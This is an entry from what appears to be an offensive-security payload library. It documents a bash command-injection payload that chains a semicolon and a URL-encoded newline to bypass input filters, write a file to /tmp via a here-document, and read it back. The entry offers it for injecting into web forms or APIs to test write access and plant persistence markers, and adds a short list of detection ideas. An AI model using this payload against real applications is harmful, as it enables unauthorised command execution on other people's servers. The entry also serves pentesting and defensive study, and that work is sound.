---
id: 83dec32e-de4c-4f87-a1f8-a736968b772b
name: url-encoded-line-return-bypass-to-create-temp-file
type: code
language: bash
verified: true
created_at: '2023-04-06T03:55:57.128411+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - command-injection
  - bypass
  - payload
  - persistence
validated: true
---

# url-encoded-line-return-bypass-to-create-temp-file

## Code

```bash
;cat>/tmp/hi<<EOF%0ahello%0aEOF
;cat</tmp/hi
hello
```

## Description

This payload chains commands using semicolons and a line return (%0A) to bypass filters, creating a temporary file /tmp/hi with content 'hello' via here-document, then reading it back. The trailing 'hello' may be extraneous output or part of the benign input; it demonstrates write and read capabilities post-injection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ;cat>/tmp/hi<<EOF%0ahello%0aEOF | Encoded command to create file with content | Customize path/content |
| %0a | URL-encoded newline within here-doc | Fixed |
| ;cat</tmp/hi | Command to read the created file | Fixed |
| hello | Potential benign suffix or output | Optional, adjust as needed |

## Usage

Use in command injection vectors to test file write permissions and establish persistence markers. Inject into web forms or APIs; verify by checking for the file on the target if shell access is gained later.

## Detection

- Monitoring for unexpected file creations in /tmp from web server processes.
- Log analysis for chained commands or here-document usage in inputs.
- Integrity checks on system files and anomaly detection in shell executions.

## Related

- [[procedures/Command-Injection-with-Line-Return-Bypass]]
